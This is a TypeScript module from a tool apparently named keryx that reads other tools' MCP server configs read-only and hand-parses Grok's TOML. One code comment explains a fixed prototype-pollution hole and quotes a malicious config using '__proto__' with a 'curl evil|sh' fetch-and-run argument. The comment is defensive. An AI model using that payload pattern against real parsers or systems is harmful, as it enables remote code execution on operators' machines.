// Reading the MCP servers somebody else's tool already configured.
//
// P3a, spec AC10. Four other tools keep a list of MCP servers on this
// machine, and an operator who has already set one up should not have to
// set it up again to use it from keryx. keryx reads those lists and
// NEVER writes to them.
//
// Read-only is not a convention here, it is the design:
//
//   - `keryx mcp add` always writes native JSON, so the file keryx owns
//     is the only file keryx changes;
//   - `remove` on a compat-only name FAILS, naming the file to edit,
//     rather than quietly writing a native entry that shadows it — a
//     "removal" that adds a file is the kind of success nobody asked
//     for;
//   - `enable`/`disable` go through the personal overlay, exactly as
//     they already do for a committed project file. Toggling somebody
//     else's config by editing it is how two tools start fighting over
//     one file.
//
// Precedence: native project, then native user, then compat. Native
// wins because it is what keryx owns and what `add` writes; a compat
// source is a courtesy read of a file whose author never agreed to
// keryx's semantics. Among compat sources the order is fixed and
// asserted, so "which one won" is answerable rather than emergent.
//
// Every reader is defensive in the same way `parseConfigFile` is: a
// malformed file is a REPORTED PROBLEM naming the file, never a crash
// and never a silent skip. A silently skipped source is
// indistinguishable from one that was never configured, which is the
// state an operator debugs for an hour.

import path from "node:path";
import os from "node:os";
import { isDefiniteAbsence, readConfigFile } from "../lib/config-dir";
import { parseJsonTolerant, type McpConfigProblem, type McpServerEntry } from "./config";

/**
 * Which other tool a server came from.
 *
 * Distinct values rather than one `"compat"`, because `keryx mcp list`
 * tags each row and "edit the file it came from" is only actionable if
 * the row says which file that is.
 */
export type CompatSource = "cursor" | "claude" | "mcp.json" | "grok";

export type CompatServers = {
  readonly servers: Record<string, McpServerEntry>;
  readonly problems: readonly McpConfigProblem[];
};

/** One compat file, in the order it is consulted. */
export type CompatFile = {
  readonly source: CompatSource;
  readonly file: string;
  /**
   * Is this file one a REPOSITORY can commit?
   *
   * The question the trust gate actually asks, and the source tag
   * cannot answer it: `.cursor/mcp.json` exists both in the operator's
   * home — which they wrote — and in the project — which whoever they
   * cloned from wrote. Same tag, opposite trust.
   */
  readonly projectLocal: boolean;
};

/**
 * Every compat file keryx will look at, in PRECEDENCE ORDER — later wins.
 *
 * The order is the SPECIFICATION'S, §2: native project, native user,
 * then Claude, Cursor, project `.mcp.json`, Grok — highest first there,
 * so reversed here because this list is consulted low-to-high.
 *
 * The first version of this comment said "the order across sources is
 * arbitrary in the sense that no external authority sets it". That was
 * simply wrong: the specification sets it, three sections above the one
 * I was reading, and my order inverted Claude and Cursor and promoted
 * `.mcp.json` above Claude. The concrete cost: an operator's own
 * `~/.claude.json` entry for `github` lost to a `github` committed in a
 * cloned repo's `.cursor/mcp.json`.
 *
 * Within one source, project-local is consulted after user-global so
 * the project wins — matching how the native readers already treat
 * `.keryx/mcp-servers.json` versus the user file.
 */
export function compatFiles(cwd: string, home?: string): CompatFile[] {
  const base = home ?? os.homedir();
  // Lowest precedence first. Spec §2 ranks them Claude > Cursor >
  // `.mcp.json` > Grok, so Grok is consulted first and Claude last.
  return [
    { source: "grok", file: path.join(base, ".grok", "config.toml"), projectLocal: false },
    { source: "grok", file: path.join(cwd, ".grok", "config.toml"), projectLocal: true },
    { source: "mcp.json", file: path.join(cwd, ".mcp.json"), projectLocal: true },
    { source: "cursor", file: path.join(base, ".cursor", "mcp.json"), projectLocal: false },
    { source: "cursor", file: path.join(cwd, ".cursor", "mcp.json"), projectLocal: true },
    { source: "claude", file: path.join(base, ".claude.json"), projectLocal: false },
  ];
}

/** `{"mcpServers": {...}}` — Cursor, `.mcp.json`, and Claude's top level. */
function readMcpServersShape(file: string, text: string): CompatServers {
  let parsed: unknown;
  try {
    parsed = parseJsonTolerant(text);
  } catch (error) {
    return {
      servers: {},
      problems: [{ file, message: `is not valid JSON: ${error instanceof Error ? error.message : String(error)}` }],
    };
  }
  if (typeof parsed !== "object" || parsed === null || Array.isArray(parsed)) {
    return { servers: {}, problems: [{ file, message: "must be a JSON object" }] };
  }
  // `collectEntries` handles `undefined` itself — a `.cursor/mcp.json`
  // with no `mcpServers` is a valid Cursor config that configures no
  // servers, and reporting it would warn every operator who has Cursor
  // installed and no MCP set up in it. A second early return here was
  // redundant, and redundant guards are what made the prototype fix
  // untestable two findings ago.
  return collectEntries(file, (parsed as { mcpServers?: unknown }).mcpServers);
}

/** Claude also keys servers per project under `projects.<cwd>.mcpServers`. */
function readClaude(file: string, text: string, cwd: string): CompatServers {
  const top = readMcpServersShape(file, text);
  let parsed: unknown;
  try {
    parsed = parseJsonTolerant(text);
  } catch {
    return top; // already reported by the call above
  }
  const projects = (parsed as { projects?: unknown } | null)?.projects;
  if (typeof projects !== "object" || projects === null || Array.isArray(projects)) {
    return top;
  }
  // The project block for THIS cwd only. Reading every project's servers
  // would hand the operator a list of things configured for directories
  // they are not in.
  const forCwd = (projects as Record<string, unknown>)[cwd];
  if (typeof forCwd !== "object" || forCwd === null) return top;
  const nested = collectEntries(file, (forCwd as { mcpServers?: unknown }).mcpServers);
  return {
    // Project-scoped beats the top level, within the same file.
    servers: { ...top.servers, ...nested.servers },
    problems: [...top.problems, ...nested.problems],
  };
}

/** Validate and collect a `{name: entry}` block from any compat shape. */
function collectEntries(file: string, block: unknown): CompatServers {
  if (block === undefined) return { servers: {}, problems: [] };
  if (typeof block !== "object" || block === null || Array.isArray(block)) {
    return { servers: {}, problems: [{ file, message: "`mcpServers` must be an object keyed by name" }] };
  }
  // `Object.create(null)` for the same reason `parseConfigFile` uses it:
  // a server named `__proto__` otherwise hits `Object.prototype`'s setter
  // and the file loads with zero problems and zero servers.
  const servers: Record<string, McpServerEntry> = Object.create(null) as Record<string, McpServerEntry>;
  const problems: McpConfigProblem[] = [];
  for (const [name, value] of Object.entries(block as Record<string, unknown>)) {
    if (typeof value !== "object" || value === null || Array.isArray(value)) {
      problems.push({ file, message: `server "${name}" must be an object` });
      continue;
    }
    servers[name] = value as McpServerEntry;
  }
  return { servers, problems };
}

/**
 * Grok's `[mcp_servers.NAME]` tables, from the SUBSET of TOML they use.
 *
 * Deliberately not a TOML library. Adding one to the runtime bundle for
 * one optional compat source that most operators do not have is a poor
 * trade, and the shape Grok writes is small: table headers, string,
 * boolean and integer scalars, and arrays of strings.
 *
 * The rule that makes a partial parser safe rather than reckless: it
 * REFUSES what it does not understand, with the line number, instead of
 * guessing. A parser that silently ignores a line it cannot read is how
 * a server's `args` go missing and the command runs with the wrong
 * arguments — which is worse than not reading the file at all.
 */
export function parseGrokToml(file: string, text: string): CompatServers {
  const servers: Record<string, McpServerEntry> = Object.create(null) as Record<string, McpServerEntry>;
  const problems: McpConfigProblem[] = [];

  let current: Record<string, unknown> | undefined;
  let currentName: string | undefined;
  /** Servers with a line this reader could not read. They are dropped. */
  const poisoned = new Set<string>();

  const lines = text.split("\n");
  for (const [index, rawLine] of lines.entries()) {
    const lineNo = index + 1;
    const line = stripComment(rawLine).trim();
    if (line === "") continue;

    const header = /^\[([^\]]+)\]$/.exec(line);
    if (header !== null) {
      const parts = (header[1] as string).split(".").map((p) => p.trim().replace(/^"(.*)"$/, "$1"));
      if (parts[0] !== "mcp_servers") {
        // Another section of Grok's config entirely. Skipped on purpose,
        // and not a problem: this reader claims only `[mcp_servers.*]`.
        current = undefined;
        continue;
      }
      const name = parts[1];
      if (name === undefined || name === "") {
        problems.push({ file, message: `line ${lineNo}: [mcp_servers] needs a server name` });
        current = undefined;
        continue;
      }
      currentName = name;
      const subTable = parts[2];
      const existing = servers[name];
      // `Object.create(null)`, like the servers map and `collectEntries`.
      //
      // A plain `{}` here was a prototype-pollution hole with a measured
      // path to RCE. `current["__proto__"]` reads back `Object.prototype`
      // — truthy, so `?? {}` never fires — and `current` BECOMES
      // `Object.prototype`; every following `key = value` writes onto it.
      // A cloned repo's `.grok/config.toml` with
      //
      //   [mcp_servers.x.__proto__]
      //   args = ["-c", "curl evil|sh"]
      //
      // gave every object in the process an `args`, so the operator's OWN
      // user-scope server — which the trust gate deliberately never holds
      // — resolved with attacker-chosen argv. `constructor` was the second
      // door: overwriting `Object.keys` took the process down.
      //
      // Two of the three maps in this file already had the null prototype.
      // The per-table objects did not, which is the same "fixed at the
      // sites we thought of" shape as the trust gate two commits ago.
      current = (existing as Record<string, unknown> | undefined) ?? (Object.create(null) as Record<string, unknown>);
      servers[name] = current as McpServerEntry;
      if (subTable !== undefined) {
        if (subTable === "") {
          problems.push({ file, message: `line ${lineNo}: [${header[1] as string}] has an empty sub-table name` });
          current = undefined;
          continue;
        }
        // No `hasOwnProperty` dance: `current` has a NULL prototype, so
        // `current[subTable]` cannot resolve through `Object.prototype`
        // and the guard would be dead code. It was there, and a
        // reviewer showed the two protections together meant no test
        // could tell which one was load-bearing — reverting either
        // alone stayed green. One protection, pinned.
        const nested =
          (current[subTable] as Record<string, unknown> | undefined) ??
          (Object.create(null) as Record<string, unknown>);
        current[subTable] = nested;
        current = nested;
      }
      continue;
    }

    // ANY line that opens something bracketed and is not a header we
    // recognised above closes the current table.
    //
    // `[[hooks]]` is standard TOML (an array of tables) and plausible in
    // a real Grok config. It does not match the header regex, so it fell
    // through to the key/value parser, failed, pushed one problem — and
    // left `current` pointing at the PREVIOUS `[mcp_servers.*]` table, so
    // every key after it was written into that server. Measured: a
    // `[[hooks]]` block following `[mcp_servers.docs]` replaced docs'
    // `command` with the attacker's, and the only signal was a parse
    // complaint about the header that said nothing about docs.
    //
    // The module's own header promises this parser "REFUSES what it does
    // not understand instead of guessing". It guessed, and the guess was
    // attacker-chosen.
    if (line.startsWith("[")) {
      problems.push({ file, message: `line ${lineNo}: "${line}" is not a table header this reader understands` });
      current = undefined;
      continue;
    }

    if (current === undefined) {
      // A key outside any `[mcp_servers.*]` table. Not ours.
      continue;
    }

    const pair = /^([A-Za-z_][A-Za-z0-9_-]*)\s*=\s*(.+)$/.exec(line);
    if (pair === null) {
      problems.push({ file, message: `line ${lineNo}: cannot read "${line}" as a TOML key/value` });
      continue;
    }
    const value = parseScalar(pair[2] as string);
    if (value === undefined) {
      problems.push({
        file,
        message: `line ${lineNo}: value for "${pair[1] as string}" is a TOML form this reader does not support (${pair[2] as string})`,
      });
      // The whole SERVER is poisoned, not just this key.
      //
      // Reporting and continuing meant the value was simply ABSENT from
      // the launched entry, which is the exact failure this file's header
      // says is impossible: a multi-line array — legal TOML, unsupported
      // here — turned
      //
      //   args = [
      //     "--read-only",
      //     "postgres://…"
      //   ]
      //
      // into a server with NO args, and `mcp-postgres` launched without
      // `--read-only`. Three problems were reported and the server ran
      // anyway. A value this reader cannot read is a server it must not
      // hand over.
      if (currentName !== undefined) poisoned.add(currentName);
      continue;
    }
    current[pair[1] as string] = value;
  }
  for (const name of poisoned) {
    // Dropped, and SAID SO. A server that silently vanishes is
    // indistinguishable from one that was never configured.
    problems.push({
      file,
      message: `server "${name}" was dropped: a line in its table could not be read, and a partly-read server is worse than none`,
    });
    delete servers[name];
  }
  return { servers, problems };
}

/** `#` starts a comment, unless it is inside a quoted string. */
function stripComment(line: string): string {
  let quoted = false;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i];
    if (ch === '"' && line[i - 1] !== "\\") quoted = !quoted;
    if (ch === "#" && !quoted) return line.slice(0, i);
  }
  return line;
}

/** A string, boolean, integer or array of strings. Anything else: undefined. */
function parseScalar(raw: string): string | boolean | number | string[] | undefined {
  const text = raw.trim();
  if (text === "true") return true;
  if (text === "false") return false;
  if (/^-?\d+$/.test(text)) return Number(text);
  const str = /^"((?:[^"\\]|\\.)*)"$/.exec(text);
  if (str !== null) return unescapeToml(str[1] as string);
  if (text.startsWith("[") && text.endsWith("]")) {
    const inner = text.slice(1, -1).trim();
    if (inner === "") return [];
    const items: string[] = [];
    for (const part of splitTopLevel(inner)) {
      const item = /^"((?:[^"\\]|\\.)*)"$/.exec(part.trim());
      // An array that is not all strings is refused wholesale rather
      // than partially read: half an `args` list is worse than none.
      if (item === null) return undefined;
      items.push(unescapeToml(item[1] as string));
    }
    return items;
  }
  return undefined;
}

function unescapeToml(value: string): string {
  return value.replace(/\\(.)/g, (_m, ch: string) =>
    ch === "n" ? "\n" : ch === "t" ? "\t" : ch === "r" ? "\r" : ch,
  );
}

/** Split on commas that are not inside a quoted string. */
function splitTopLevel(inner: string): string[] {
  const parts: string[] = [];
  let quoted = false;
  let start = 0;
  for (let i = 0; i < inner.length; i++) {
    const ch = inner[i];
    if (ch === '"' && inner[i - 1] !== "\\") quoted = !quoted;
    if (ch === "," && !quoted) {
      parts.push(inner.slice(start, i));
      start = i + 1;
    }
  }
  const tail = inner.slice(start).trim();
  if (tail !== "") parts.push(tail);
  return parts;
}

/** Read one compat file. Absent is silence; unreadable is a problem. */
export function readCompatFile(entry: CompatFile, cwd: string): CompatServers {
  const read = readConfigFile(entry.file);
  if (!read.ok) {
    return isDefiniteAbsence(read.reason)
      ? { servers: {}, problems: [] }
      : { servers: {}, problems: [{ file: entry.file, message: `could not be read (${read.reason})` }] };
  }
  if (entry.source === "grok") return parseGrokToml(entry.file, read.text);
  if (entry.source === "claude") return readClaude(entry.file, read.text, cwd);
  return readMcpServersShape(entry.file, read.text);
}
